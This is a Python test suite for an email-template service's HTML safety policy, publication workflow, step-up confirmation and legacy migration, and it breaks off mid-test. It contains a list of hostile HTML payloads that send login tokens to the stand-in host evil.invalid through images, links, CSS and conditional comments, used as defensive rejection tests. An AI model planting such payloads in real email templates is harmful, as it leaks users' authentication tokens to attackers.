"""Publication boundary, HTML exfiltration policy and real PostgreSQL tests."""

from __future__ import annotations
from contextlib import asynccontextmanager
import asyncio
import base64
import hashlib
import hmac
import importlib.util
import json
import os
from pathlib import Path
import sys
import tempfile
import time
import types
import unittest
from unittest.mock import patch
import uuid
import asyncpg
from fastapi import HTTPException
import httpx
from starlette.requests import Request

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "template-service"))
sys.path.insert(0, str(ROOT / "api-internal"))
sys.path.insert(0, str(ROOT / "generateProject"))
import service
import policy
import legacy_migration
import configure_mailer_runtime as runtime
import migrate_mailer_templates as migration


def module(name, path):
    spec = importlib.util.spec_from_file_location(name, path)
    result = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(result)
    return result


adapter = module("mailer_adapter", ROOT / "api-internal/app/mailer_templates.py")
stepup_path = ROOT / "api-internal/app/mailer_step_up.py"
stepup = module("mailer_stepup", stepup_path) if stepup_path.exists() else None
APPROVED = ["https://example.com"]
BODY = (
    '<h1>Template seguro {{ .Token }}</h1><a href="{{ .ConfirmationURL }}">Entrar</a>'
)


class HTMLPolicyTests(unittest.TestCase):
    def test_safe_layout_code_confirmation_link_and_project_verification(self):
        for body in (
            BODY,
            "<p>{{ .Token }} enviado para {{ .SendingTo }}</p>",
            '<p>{{ .Token }}</p><img src="https://example.com/logo.png">',
            "<style>@media (max-width: 600px) {p {color: rgb(1,2,3); padding: 12px;}}</style><p>{{ .Token }}</p>",
            '<a href="{{ .SiteURL }}?token={{ .TokenHash }}&type=magiclink">Acessar</a>',
            "<p>{{ if .Data.name }}Olá {{ .Data.name }}{{ else }}Olá{{ end }} {{ .Token }}</p>",
        ):
            with self.subTest(body=body):
                policy.validate(body, APPROVED, "magic_link")

    def test_exfiltration_and_active_content_are_rejected(self):
        attacks = [
            '<img src="https://evil.invalid/?t={{ .Token }}">',
            '<img src="https://example.com/?t={{ .Token }}">',
            '<a href="https://evil.invalid/?t={{ .Token }}">Entrar</a>',
            '<a href="https://example.com/?next={{ .ConfirmationURL }}">Entrar</a>',
            '<a href="{{ .RedirectTo }}">Entrar</a>',
            '<a href="{{ .Data.url }}">Entrar</a>',
            '<a href="https://example.com@evil.invalid/">Entrar</a>',
            '<a href="//evil.invalid/">Entrar</a>',
            '<a href="jav&#x61;script:alert(1)">Entrar</a>',
            '<img src="https://example.com/logo.png" onerror="alert(1)">',
            "<script>void(0)</script>",
            '<iframe src="https://example.com"></iframe>',
            '<svg><a href="https://evil.invalid">go</a></svg>',
            '<form action="https://example.com"><input name="t" value="{{ .Token }}"></form>',
            '<meta http-equiv="refresh" content="0;url=https://evil.invalid/">',
            '<p style="background:u\\72l(https://evil.invalid/)">texto</p>',
            '<style>@import "https://evil.invalid/style.css";</style>',
            '<style>p {background-image: image-set("https://evil.invalid/x" 1x);}</style>',
            '<p style="--hidden: url(https://evil.invalid)">text</p>',
            "<style>p{color:{{ .Token }}}</style>",
            '<a href="https://example.com" href="https://evil.invalid">go</a>',
            '<!--[if mso]><img src="https://evil.invalid/?t={{ .Token }}"><![endif]-->',
            "{{ $t := .Token }}<p>{{ $t }}</p>",
            "{{ range .Data }}{{ .Token }}{{ end }}",
            '<p>{{ printf "%s" .Token }}</p>',
            '<a href="{{ if .Email }}https://example.com{{ else }}https://evil.invalid{{ end }}">go</a>',
        ]
        for attack in attacks:
            with (
                self.subTest(attack=attack),
                self.assertRaises((policy.PolicyError, ValueError)),
            ):
                policy.validate("<p>{{ .Token }}</p>" + attack, APPROVED, "magic_link")

    def test_origins_are_exact_and_cannot_be_encoded_or_wildcards(self):
        for origin in [
            "http://example.com",
            "https://*.example.com",
            "https://example.com@evil.invalid",
            "https://example.com/path",
            "https://example.com%2eevil.invalid",
        ]:
            with self.subTest(origin=origin), self.assertRaises(policy.PolicyError):
                policy.origins([origin])
        for href in [
            "https://example.com.evil.invalid",
            "https://evil.example.com",
            "https://example.com:8443",
        ]:
            with self.subTest(href=href), self.assertRaises(policy.PolicyError):
                policy.validate(
                    f'<a href="{href}">{{{{ .Token }}}}</a>', APPROVED, "magic_link"
                )

    def test_embedded_defaults_obey_policy(self):
        for path in (ROOT / "template-service/engine/defaults").glob("*.html"):
            policy.validate(path.read_text(), [], path.stem)

    def test_resource_bounds_and_markup_in_template_actions(self):
        for body in [
            "<div>" * 5001 + "{{ .Token }}" + "</div>" * 5001,
            "{{ if .Token }}" * 17 + "{{ .Token }}" + "{{ end }}" * 17,
        ]:
            with self.assertRaises(policy.PolicyError):
                policy.validate(body, APPROVED, "magic_link")


class DownPool:
    @asynccontextmanager
    async def acquire(self):
        raise OSError("database unavailable")
        yield


@unittest.skipUnless(
    os.getenv("MAILER_TEST_DSN") and os.getenv("MAILER_TEMPLATE_ENGINE"),
    "Disposable database and Go engine required",
)
class MailerIntegrationTests(unittest.IsolatedAsyncioTestCase):
    async def asyncSetUp(self):
        self.dsn = os.environ["MAILER_TEST_DSN"]
        self.schema = "mailer_test_" + uuid.uuid4().hex
        self.admin = await asyncpg.connect(self.dsn)
        await self.admin.execute("CREATE SCHEMA " + self.schema)
        self.pool = await asyncpg.create_pool(
            self.dsn,
            min_size=1,
            max_size=5,
            server_settings={"search_path": self.schema + ",pg_catalog"},
        )
        async with self.pool.acquire() as conn:
            await conn.execute(
                """CREATE TABLE projects(id UUID PRIMARY KEY,tenant_uuid UUID UNIQUE,name TEXT UNIQUE);
                CREATE TABLE project_members(project_id UUID,user_id TEXT,role TEXT);"""
            )
            base = ROOT / "api-internal/app/mailer_templates_schema.sql"
            sec = ROOT / "api-internal/app/mailer_templates_security.sql"
            if not base.exists():
                base = ROOT / "api-internal/app/migrations/0023_mailer_templates.sql"
            if not sec.exists():
                sec = (
                    ROOT
                    / "api-internal/app/migrations/0024_mailer_template_publication.sql"
                )
            await conn.execute(base.read_text().replace("public.", self.schema + "."))
            await conn.execute(sec.read_text().replace("public.", self.schema + "."))
            legacy_schema = (
                ROOT
                / "api-internal/app/migrations/0025_mailer_template_legacy_import.sql"
            )
            if legacy_schema.exists():
                await conn.execute(
                    legacy_schema.read_text().replace("public.", self.schema + ".")
                )
            self.project, self.tenant, self.other = (
                uuid.uuid4(),
                uuid.uuid4(),
                uuid.uuid4(),
            )
            await conn.execute(
                "INSERT INTO projects VALUES($1,$2,'alpha'),($3,$4,'bravo')",
                self.project,
                self.tenant,
                uuid.uuid4(),
                self.other,
            )
            await conn.execute(
                "INSERT INTO project_members VALUES($1,'owner','admin'),($1,'viewer','member')",
                self.project,
            )
        self.engine = service.Engine()
        self.defaults = await self.engine.run("defaults")
        self.secret = "a" * 64
        self.admin_secret = "b" * 64
        self.publish_secret = "c" * 64
        self.templates = service.Templates(
            self.pool,
            self.defaults,
            self.engine,
            self.secret,
            admin_secret=self.admin_secret,
            publish_secret=self.publish_secret,
        )
        self.client = httpx.AsyncClient(
            transport=httpx.ASGITransport(app=service.create_app(self.templates)),
            base_url="http://mailer",
        )
        self.headers = {
            "X-Mailer-Admin": self.admin_secret,
            "X-Mailer-Actor": "owner",
            "X-Mailer-Origins": json.dumps(APPROVED),
        }
        self.base = f"/internal/projects/{self.tenant}/mailer-templates"

    async def asyncTearDown(self):
        await self.client.aclose()
        await self.pool.close()
        await self.admin.execute("DROP SCHEMA " + self.schema + " CASCADE")
        await self.admin.close()

    async def get_runtime(self, tenant=None, kind="magic_link", key=None):
        tenant = str(tenant or self.tenant)
        return await self.client.get(
            f"/mailer/{tenant}/{kind}",
            params={"k": key or service.project_key(self.secret, tenant)},
        )

    async def draft(self, body=BODY, version=0):
        r = await self.client.put(
            self.base + "/magic_link",
            headers=self.headers,
            json={"version": version, "body": body},
        )
        self.assertEqual(r.status_code, 200, r.text)
        return r.json()

    def proof(self, row, **overrides):
        payload = {"version": row["version"], "draft_digest": row["draft_digest"]}
        return adapter.publication_proof(
            self.publish_secret, str(self.tenant), "magic_link", "owner", payload
        )

    async def publish(self, row, proof=None):
        return await self.client.post(
            self.base + "/magic_link/publish",
            headers={**self.headers, "X-Mailer-Publication": proof or self.proof(row)},
            json={"version": row["version"], "draft_digest": row["draft_digest"]},
        )

    async def test_draft_never_changes_runtime_and_publish_requires_separate_confirmation(
        self,
    ):
        row = await self.draft()
        self.assertTrue(row["has_draft"])
        self.assertEqual(row["published_version"], 0)
        self.assertEqual((await self.get_runtime()).text, self.defaults["magic_link"])
        r = await self.publish(row, "invalid")
        self.assertEqual(r.status_code, 403)
        r = await self.publish(row)
        self.assertEqual(r.status_code, 200, r.text)
        self.assertFalse(r.json()["has_draft"])
        self.assertEqual((await self.get_runtime()).text, BODY)
        newer = await self.draft("<p>Novo {{ .Token }}</p>", 2)
        self.assertEqual((await self.get_runtime()).text, BODY)
        self.assertEqual((await self.publish(newer)).status_code, 200)
        self.assertEqual((await self.get_runtime()).text, "<p>Novo {{ .Token }}</p>")

    async def test_confirmation_cannot_publish_a_changed_draft_or_another_project(self):
        row = await self.draft()
        proof = self.proof(row)
        await self.draft("<p>Outro {{ .Token }}</p>", 1)
        self.assertEqual((await self.publish(row, proof)).status_code, 409)
        other = await self.client.post(
            f"/internal/projects/{self.other}/mailer-templates/magic_link/publish",
            headers={**self.headers, "X-Mailer-Publication": proof},
            json={"version": row["version"], "draft_digest": row["draft_digest"]},
        )
        self.assertEqual(other.status_code, 403)
        self.assertEqual((await self.get_runtime()).text, self.defaults["magic_link"])

    async def test_one_publication_and_audit_for_concurrent_requests(self):
        row = await self.draft()
        proof = self.proof(row)
        responses = await asyncio.gather(
            self.publish(row, proof), self.publish(row, proof)
        )
        self.assertEqual(sorted(r.status_code for r in responses), [200, 409])
        async with self.pool.acquire() as conn:
            self.assertEqual(
                await conn.fetchval(
                    "SELECT count(*) FROM mailer_template_version WHERE action='publish'"
                ),
                1,
            )

    async def test_reset_is_draft_and_reauthentication_precedes_default_publication(
        self,
    ):
        row = await self.draft()
        self.assertEqual((await self.publish(row)).status_code, 200)
        r = await self.client.request(
            "DELETE",
            self.base + "/magic_link",
            headers=self.headers,
            json={"version": 2},
        )
        self.assertEqual(r.status_code, 200)
        self.assertTrue(r.json()["draft_default"])
        self.assertEqual((await self.get_runtime()).text, BODY)
        r = await self.publish(r.json())
        self.assertEqual(r.status_code, 200)
        self.assertEqual((await self.get_runtime()).text, self.defaults["magic_link"])
        history = (
            await self.client.get(
                self.base + "/magic_link/history", headers=self.headers
            )
        ).json()["versions"]
        self.assertEqual(
            [v["action"] for v in history],
            ["publish_default", "draft_default", "publish", "draft"],
        )
        self.assertTrue(all("body" not in v for v in history))

    async def test_policy_rechecked_at_publication_and_at_runtime(self):
        row = await self.draft()
        async with self.pool.acquire() as conn:
            evil = '<p>{{ .Token }}</p><img src="https://evil.invalid/?c={{ .Token }}">'
            await conn.execute(
                "UPDATE mailer_template SET draft_body=$2 WHERE project_id=$1",
                self.project,
                evil,
            )
        self.assertEqual((await self.publish(row)).status_code, 409)
        row["draft_digest"] = service.draft_digest(evil, APPROVED)
        self.assertEqual((await self.publish(row)).status_code, 422)
        async with self.pool.acquire() as conn:
            await conn.execute(
                "UPDATE mailer_template SET body=$2,allowed_origins=$3::jsonb WHERE project_id=$1",
                self.project,
                evil,
                json.dumps(APPROVED),
            )
        self.templates.cache.clear()
        self.templates.cache_bytes = 0
        self.assertEqual((await self.get_runtime()).text, self.defaults["magic_link"])

    async def test_bad_html_never_saved_and_authorization_is_project_scoped(self):
        for body in [
            "{{ .Token",
            "sem código",
            "{{ .Token }}<script>void(0)</script>",
            '<p>{{ .Token }}</p><img src="https://evil.invalid/?t={{ .Token }}">',
        ]:
            r = await self.client.put(
                self.base + "/magic_link",
                headers=self.headers,
                json={"version": 0, "body": body},
            )
            self.assertEqual(r.status_code, 422, r.text)
        self.assertEqual((await self.client.get(self.base)).status_code, 403)
        self.assertEqual(
            (
                await self.get_runtime(
                    self.other, key=service.project_key(self.secret, str(self.tenant))
                )
            ).status_code,
            403,
        )
        self.assertEqual((await self.get_runtime(kind="unknown")).status_code, 404)
        self.assertEqual((await self.get_runtime(uuid.uuid4())).status_code, 404)

    async def test_database_failure_uses_last_published_value_and_defaults(self):
        row = await self.draft()
        await self.publish(row)
        self.templates.cache[(str(self.tenant), "magic_link")] = (
            time.monotonic() - 1,
            BODY,
            "override",
        )
        self.templates.pool = DownPool()
        r = await self.get_runtime()
        self.assertEqual(r.text, BODY)
        self.assertEqual(r.headers["x-template-source"], "last_good")
        self.assertEqual(
            (await self.get_runtime(kind="recovery")).text, self.defaults["recovery"]
        )

    async def test_legacy_publications_are_quarantined_idempotently(self):
        async with self.pool.acquire() as conn:
            await conn.execute(
                "INSERT INTO mailer_template(project_id,kind,body,version,updated_by,policy_version) VALUES($1,'invite',$2,1,'legacy',0)",
                self.project,
                "{{ .Token }}<script>void(0)</script>",
            )
            sec = ROOT / "api-internal/app/mailer_templates_security.sql"
            if not sec.exists():
                sec = (
                    ROOT
                    / "api-internal/app/migrations/0024_mailer_template_publication.sql"
                )
            await conn.execute(sec.read_text().replace("public.", self.schema + "."))
            await conn.execute(sec.read_text().replace("public.", self.schema + "."))
            row = await conn.fetchrow(
                "SELECT * FROM mailer_template WHERE project_id=$1 AND kind='invite'",
                self.project,
            )
            self.assertIsNone(row["body"])
            self.assertTrue(row["draft_exists"])
            self.assertEqual(row["version"], 2)
        self.assertEqual(
            (await self.get_runtime(kind="invite")).text, self.defaults["invite"]
        )

    async def test_public_api_consumes_confirmation_and_does_not_forward_password(self):
        if stepup is None:
            self.skipTest("IDR-specific password confirmation")
        from fastapi import FastAPI

        actor, sid, identity_key = "a" * 64, "b" * 64, "d" * 64
        payload = {"version": 1, "draft_digest": "f" * 64}
        now = int(time.time())
        claims = {
            "sub": actor,
            "sid": sid,
            "project": "alpha",
            "kind": "magic_link",
            "version": 1,
            "digest": payload["draft_digest"],
            "iat": now,
            "exp": now + 180,
            "jti": "e" * 32,
        }
        encoded = (
            base64.urlsafe_b64encode(json.dumps(claims).encode()).rstrip(b"=").decode()
        )
        key = hmac.new(identity_key.encode(), stepup.CONTEXT, hashlib.sha256).digest()
        token = (
            "mp1."
            + encoded
            + "."
            + hmac.new(key, encoded.encode(), hashlib.sha256).hexdigest()
        )
        forwarded = []

        class InternalClient:
            async def __aenter__(self):
                return self

            async def __aexit__(self, *args):
                pass

            async def request(inner, method, url, **kwargs):
                forwarded.append(kwargs)
                if url.endswith("/publish"):
                    proof = service.publication_claims(
                        kwargs["headers"]["X-Mailer-Publication"], self.publish_secret
                    )
                    self.assertEqual(proof["digest"], payload["draft_digest"])
                return httpx.Response(200, json={"ok": True})

        with tempfile.TemporaryDirectory() as tmp:
            directory = Path(tmp)
            (directory / ".env").write_text(
                "SITE_URL=https://example.com/verify-success.html\nAPI_EXTERNAL_URL=https://example.com/auth/v1\n"
            )

            async def authorize(project, request, pool):
                return str(self.tenant), actor, directory

            async def pool():
                return self.pool

            async def confirm(project, kind, data, request, pool, tenant, user):
                async with pool.acquire() as conn:
                    async with conn.transaction():
                        await stepup.consume(
                            conn,
                            request.headers.get("X-Step-Up-Token", ""),
                            identity_key,
                            user,
                            sid,
                            project,
                            kind,
                            data,
                        )

            app = FastAPI()
            app.include_router(adapter.build_router(pool, authorize, confirm=confirm))
            outer = httpx.AsyncClient(
                transport=httpx.ASGITransport(app=app), base_url="http://studio"
            )
            stub = types.SimpleNamespace(
                AsyncClient=lambda **kwargs: InternalClient(), HTTPError=httpx.HTTPError
            )
            with (
                patch.object(adapter, "httpx", stub),
                patch.object(
                    adapter,
                    "credential",
                    side_effect=lambda name: (
                        self.admin_secret
                        if name == "ADMIN_KEY"
                        else self.publish_secret
                    ),
                ),
            ):
                path = "/api/projects/alpha/mailer-templates/magic_link/publish"
                self.assertEqual(
                    (await outer.post(path, json=payload)).status_code, 403
                )
                self.assertEqual(
                    (
                        await outer.post(
                            path,
                            headers={"X-Step-Up-Token": token},
                            json={**payload, "draft_digest": "a" * 64},
                        )
                    ).status_code,
                    403,
                )
                self.assertEqual(
                    (
                        await outer.post(
                            path,
                            headers={"X-Step-Up-Token": token},
                            json={**payload, "password": "should-not-forward"},
                        )
                    ).status_code,
                    422,
                )
                self.assertEqual(forwarded, [])
                self.assertEqual(
                    (
                        await outer.post(
                            path, headers={"X-Step-Up-Token": token}, json=payload
                        )
                    ).status_code,
                    200,
                )
                self.assertEqual(
                    (
                        await outer.post(
                            path, headers={"X-Step-Up-Token": token}, json=payload
                        )
                    ).status_code,
                    403,
                )
                self.assertEqual(len(forwarded), 1)
                self.assertNotIn("password", str(forwarded))
            await outer.aclose()

    async def test_existing_project_administrator_authorization_is_required(self):
        def request(user, groups=""):
            return Request(
                {
                    "type": "http",
                    "headers": [
                        (b"remote-email", user.encode()),
                        (b"remote-groups", groups.encode()),
                    ],
                }
            )

        with patch.dict(
            sys.modules,
            {
                "app.main": types.SimpleNamespace(
                    validate_project_id=lambda value: value
                )
            },
        ):
            result = await adapter.authorize_idr("alpha", request("owner"), self.pool)
            self.assertEqual(result[:2], (str(self.tenant), "owner"))
            with self.assertRaises(HTTPException) as error:
                await adapter.authorize_idr("alpha", request("viewer"), self.pool)
            self.assertEqual(error.exception.status_code, 403)
            with self.assertRaises(HTTPException) as error:
                await adapter.authorize_idr("alpha", request(""), self.pool)
            self.assertEqual(error.exception.status_code, 401)

    async def test_multitenant_confirmation_action_is_accepted_and_consumed_once(self):
        source = ROOT / "api-internal/app/step_up_auth.py"
        if not source.exists():
            self.skipTest("Multi-tenant action-bound confirmation")
        from app.step_up_auth import consume_step_up_grant, STEP_UP_KEY_CONTEXT

        actor = uuid.uuid4()
        now = int(time.time())
        resource = "magic_link:1:" + ("f" * 64)
        claims = {
            "sub": str(actor),
            "login_session": "s" * 43,
            "action": "publish_mailer_template",
            "project": "abcdefghijklmnopqrst",
            "resource": resource,
            "jti": "a" * 22,
            "iat": now,
            "exp": now + 300,
        }
        secret = "synthetic-stepup-secret"
        encoded = (
            base64.urlsafe_b64encode(json.dumps(claims).encode()).rstrip(b"=").decode()
        )
        key = hmac.new(secret.encode(), STEP_UP_KEY_CONTEXT, hashlib.sha256).digest()
        token = (
            "su1."
            + encoded
            + "."
            + hmac.new(key, encoded.encode(), hashlib.sha256).hexdigest()
        )
        async with self.pool.acquire() as conn:
            await conn.execute(
                """CREATE TABLE studio_step_up_grant_consumptions(jti TEXT PRIMARY KEY,user_id UUID,
                login_session_hash TEXT,action TEXT CHECK(action='reveal_secret_key'),project_id UUID,project_ref TEXT,
                resource_id TEXT,issued_at TIMESTAMPTZ,expires_at TIMESTAMPTZ)"""
            )
            await conn.execute(
                (
                    ROOT
                    / "api-internal/app/migrations/0024_mailer_template_publication.sql"
                )
                .read_text()
                .replace("public.", self.schema + ".")
            )
            params = dict(
                token=token,
                secret=secret,
                max_clock_skew_seconds=30,
                auth_user={"db_user_id": actor, "login_session": "s" * 43},
                action="publish_mailer_template",
                project_id=self.project,
                project_ref="abcdefghijklmnopqrst",
                resource_id=resource,
            )
            await consume_step_up_grant(conn, **params)
            with self.assertRaises(HTTPException):
                await consume_step_up_grant(conn, **params)

    async def test_legacy_import_is_draft_only_and_cannot_bypass_publication_policy(
        self,
    ):
        evil = "{{ .Token }}<script>void(0)</script>"
        response = await self.client.post(
            self.base + "/magic_link/import",
            headers={**self.headers, "X-Mailer-Actor": "legacy-migration"},
            json={"version": 0, "body": evil},
        )
        self.assertEqual(response.status_code, 200, response.text)
        self.assertEqual((await self.get_runtime()).text, self.defaults["magic_link"])
        # Even a valid publication proof cannot publish an unreviewed import.
        self.assertEqual((await self.publish(response.json())).status_code, 422)
        self.assertEqual(
            (
                await self.client.post(
                    self.base + "/magic_link/import",
                    headers=self.headers,
                    json={"version": 1, "body": BODY},
                )
            ).status_code,
            403,
        )

    def legacy_payload(self, *, other=True):
        defaults = {
            kind: (ROOT / "auth_template" / name).read_text()
            for kind, name in migration.FILES.items()
            if (ROOT / "auth_template" / name).is_file()
        }
        # Existing templates use conditional RedirectTo links, which new
        # Studio edits must not be allowed to publish without policy checks.
        custom = defaults["magic_link"].replace(
            "Seu Link de Acesso", "IDR Campo legado"
        )
        projects = [
            {
                "name": "alpha",
                "tenant": str(self.tenant),
                "templates": {
                    kind: custom if kind == "magic_link" else None
                    for kind in service.KINDS
                },
            }
        ]
        if other:
            projects.append(
                {
                    "name": "bravo",
                    "tenant": str(self.other),
                    "templates": {kind: None for kind in service.KINDS},
                }
            )
        return {"defaults": defaults, "projects": projects}

    async def import_active_legacy(self, payload=None):
        return await legacy_migration.import_templates(
            self.pool,
            self.engine,
            self.publish_secret,
            payload or self.legacy_payload(),
        )

    async def test_local_migration_registers_defaults_and_active_project_overrides_once(
        self,
    ):
        # Prime the old cache before the out-of-process migration writes.
        self.assertEqual((await self.get_runtime()).text, self.defaults["magic_link"])
        payload = self.legacy_payload()
        result = await self.import_active_legacy(payload)
        self.assertEqual(result, {"imported": 12, "projects": 2})
        listing = await self.client.get(self.base, headers=self.headers)
        self.assertEqual(listing.status_code, 200, listing.text)
        row = next(r for r in listing.json()["templates"] if r["kind"] == "magic_link")
        custom = payload["projects"][0]["templates"]["magic_link"]
        self.assertEqual(row["published_body"], custom)
        self.assertEqual(row["default_body"], payload["defaults"]["magic_link"])
        self.assertEqual(
            (row["source"], row["has_draft"], row["published_version"]),
            ("override", False, 1),
        )
        runtime = await self.get_runtime()
        self.assertEqual(
            (runtime.text, runtime.headers["x-template-source"]), (custom, "override")
        )
        default = await self.get_runtime(self.other)
        self.assertEqual(
            (default.text, default.headers["x-template-source"]),
            (payload["defaults"]["magic_link"], "default"),
        )
        self.assertEqual((await self.import_active_legacy(payload))["imported"], 0)
        async with self.pool.acquire() as conn:
            self.assertEqual(
                await conn.fetchval("SELECT count(*) FROM mailer_template_default"), 6
            )
            self.assertEqual(
                await conn.fetchval("SELECT count(*) FROM mailer_template"), 12
            )
            self.assertEqual(
                await conn.fetchval("SELECT count(*) FROM mailer_template_version"), 12
            )
            self.assertEqual(
                await conn.fetchval(
                    "SELECT action FROM mailer_template_version WHERE project_id=$1 AND kind='magic_link'",
                    self.project,
                ),
                "import_active",
            )
            sec = ROOT / "api-internal/app/mailer_templates_security.sql"
            if not sec.exists():
                sec = (
                    ROOT
                    / "api-internal/app/migrations/0025_mailer_template_legacy_import.sql"
                )
            await conn.execute(sec.read_text().replace("public.", self.schema + "."))
        self.templates.cache.clear()
        self.assertEqual((await self.get_runtime()).text, custom)

    async def test_email_change_preview_supports_the_legacy_sending_to_variable(self):
        response = await self.client.post(
            self.base + "/email_change/preview",
            headers=self.headers,
            json={"body": "<p>{{ .Token }} enviado para {{ .SendingTo }}</p>"},
        )
        self.assertEqual(response.status_code, 200, response.text)
        self.assertIn("123456 enviado para pessoa@example.com", response.json()["html"])

    async def test_preview_renders_signed_legacy_but_does_not_exempt_new_edits(self):
        payload = self.legacy_payload()
        await self.import_active_legacy(payload)
        original = payload["projects"][0]["templates"]["magic_link"]
        response = await self.client.post(self.base + "/magic_link/preview", headers=self.headers, json={"body": original})
        self.assertEqual(response.status_code, 200, response.text)
        self.assertIn("IDR Campo legado", response.json()["html"])
        edited = original.replace("IDR Campo legado", "Outra edição")
        response = await self.client.post(self.base + "/magic_link/preview", headers=self.headers, json={"body": edited})
        self.assertEqual(response.status_code, 422, response.text)
        other = f"/internal/projects/{self.other}/mailer-templates/magic_link/preview"
        response = await self.client.post(other, headers=self.headers, json={"body": original})
        self.assertEqual(response.status_code, 422, response.text)

    async def test_new_studio_edits_still_need_publication_after_migration(self):
        payload = self.legacy_payload()
        await self.import_active_legacy(payload)
        custom = payload["projects"][0]["templates"]["magic_link"]
        row = await self.draft(version=1)
        self.assertEqual((await self.get_runtime()).text, custom)
        # Retrying the host migration preserves this newer administrator draft.
        self.assertEqual((await self.import_active_legacy(payload))["imported"], 0)
        response = await self.publish(row)
        self.assertEqual(response.status_code, 200, response.text)
        self.assertEqual((await self.get_runtime()).text, BODY)
        async with self.pool.acquire() as conn:
            self.assertIsNone(
                await conn.fetchval(
                    "SELECT migration_signature FROM mailer_template WHERE project_id=$1 AND kind='magic_link'",
                    self.project,
                )
            )
        reset = await self.client.request(
            "DELETE",
            self.base + "/magic_link",
            headers=self.headers,
            json={"version": response.json()["version"]},
        )
        self.assertEqual(reset.status_code, 200, reset.text)
        self.assertEqual((await self.publish(reset.json())).status_code, 200)
        self.assertEqual(
            (await self.get_runtime()).text, payload["defaults"]["magic_link"]
        )

    async def test_legacy_signature_cannot_be_reused_for_another_html_or_project(self):
        payload = self.legacy_payload()
        await self.import_active_legacy(payload)
        async with self.pool.acquire() as conn:
            await conn.execute(
                "UPDATE mailer_template SET body=$2 WHERE project_id=$1 AND kind='magic_link'",
                self.project,
                "<p>Tampered {{ .Token }}</p>",
            )
        self.assertEqual((await self.get_runtime()).text, self.defaults["magic_link"])
        async with self.pool.acquire() as conn:
            await conn.execute(
                """UPDATE mailer_template SET body=$2,migration_signature=$3
                WHERE project_id=$1 AND kind='magic_link'""",
                self.project,
                payload["projects"][0]["templates"]["magic_link"],
                service.migration_signature(
                    self.publish_secret,
                    str(self.other),
                    "magic_link",
                    1,
                    payload["projects"][0]["templates"]["magic_link"],
                ),
            )
            await conn.execute(
                "UPDATE mailer_template_default SET body=$1 WHERE kind='recovery'",
                "<p>Tampered {{ .Token }}</p>",
            )
        self.assertEqual((await self.get_runtime()).text, self.defaults["magic_link"])
        self.assertEqual(
            (await self.get_runtime(self.other, kind="recovery")).text,
            self.defaults["recovery"],
        )

    async def test_legacy_import_rolls_back_all_projects_on_studio_conflict(self):
        await self.draft()
        with self.assertRaisesRegex(ValueError, "Studio já contém outra edição"):
            await self.import_active_legacy()
        async with self.pool.acquire() as conn:
            self.assertEqual(
                await conn.fetchval("SELECT count(*) FROM mailer_template_default"), 0
            )
            self.assertEqual(
                await conn.fetchval("SELECT count(*) FROM mailer_template"), 1
            )
            self.assertEqual(
                await conn.fetchval("SELECT count(*) FROM mailer_template_version"), 1
            )
            self.assertEqual(
                await conn.fetchval(
                    "SELECT draft_body FROM mailer_template WHERE project_id=$1",
                    self.project,
                ),
                BODY,
            )

    async def test_legacy_import_promotes_a_previous_migration_draft_without_manual_publication(
        self,
    ):
        payload = self.legacy_payload(other=False)
        custom = payload["projects"][0]["templates"]["magic_link"]
        draft = await self.client.post(
            self.base + "/magic_link/import",
            headers={**self.headers, "X-Mailer-Actor": "legacy-migration"},
            json={"version": 0, "body": custom},
        )
        self.assertEqual(draft.status_code, 200, draft.text)
        await self.import_active_legacy(payload)
        listing = (await self.client.get(self.base, headers=self.headers)).json()
        row = next(r for r in listing["templates"] if r["kind"] == "magic_link")
        self.assertEqual((row["published_version"], row["has_draft"]), (2, False))
        self.assertEqual((await self.get_runtime()).text, custom)

    async def test_project_name_and_tenant_must_match_before_import(self):
        payload = self.legacy_payload()
        payload["projects"][0]["tenant"] = str(self.other)
        with self.assertRaisesRegex(ValueError, "não correspondem ao cadastro"):
            await self.import_active_legacy(payload)
        async with self.pool.acquire() as conn:
            self.assertEqual(
                await conn.fetchval("SELECT count(*) FROM mailer_template_default"), 0
            )
            self.assertEqual(
                await conn.fetchval("SELECT count(*) FROM mailer_template"), 0
            )

    async def test_migration_works_with_the_dedicated_role_and_rejects_unrelated_access(
        self,
    ):
        role = "mailer_role_" + uuid.uuid4().hex
        password = "e" * 64
        sql = runtime.role_sql(password).replace("mailer_template_service", role)
        sql = sql.replace("public.", self.schema + ".").replace(
            "SCHEMA public", "SCHEMA " + self.schema
        )
        await self.admin.execute(sql)
        limited = await asyncpg.create_pool(
            self.dsn,
            user=role,
            password=password,
            min_size=1,
            max_size=2,
            server_settings={"search_path": self.schema + ",pg_catalog"},
        )
        try:
            result = await legacy_migration.import_templates(
                limited, self.engine, self.publish_secret, self.legacy_payload()
            )
            self.assertEqual(result["imported"], 12)
            self.templates.pool = limited
            self.assertIn("IDR Campo legado", (await self.get_runtime()).text)
            async with limited.acquire() as conn:
                for query in (
                    "SELECT * FROM project_members",
                    "DELETE FROM mailer_template_version",
                    "CREATE TABLE should_fail(id integer)",
                ):
                    with self.assertRaises(asyncpg.InsufficientPrivilegeError):
                        await conn.execute(query)
        finally:
            self.templates.pool = self.pool
            await limited.close()
            await self.admin.execute("DROP OWNED BY " + role)
            await self.admin.execute("DROP ROLE " + role)

    async def test_copy_creates_draft_without_publication(self):
        row = await self.draft()
        await self.publish(row)
        async with self.pool.acquire() as conn:
            dest = await conn.fetchval(
                "SELECT id FROM projects WHERE tenant_uuid=$1", self.other
            )
            await adapter.copy_project(conn, self.project, dest, "owner")
        self.assertEqual(
            (await self.get_runtime(self.other)).text, self.defaults["magic_link"]
        )
        listing = (
            await self.client.get(
                f"/internal/projects/{self.other}/mailer-templates",
                headers=self.headers,
            )
        ).json()
        row = next(r for r in listing["templates"] if r["kind"] == "magic_link")
        self.assertTrue(row["has_draft"])
        self.assertEqual(row["body"], BODY)


class RuntimeAndConfirmationTests(unittest.TestCase):
    def test_credentials_are_distinct_preserved_and_not_in_global_env(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / ".env").write_text("KEEP=value\n")
            first = runtime.prepare(root)
            self.assertEqual(first, runtime.prepare(root))
            self.assertEqual(len(set(first.values())), 4)
            self.assertEqual((root / ".env").read_text(), "KEEP=value\n")
            self.assertEqual((root / "secrets/mailer").stat().st_mode & 0o777, 0o700)

    def test_missing_configured_secret_requires_restore_without_rotation(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / ".env").write_text("KEEP=value\n")
            original = runtime.prepare(root)
            (root / "secrets/mailer/URL_SECRET").unlink()
            with self.assertRaises(RuntimeError):
                runtime.prepare(root)
            self.assertEqual(
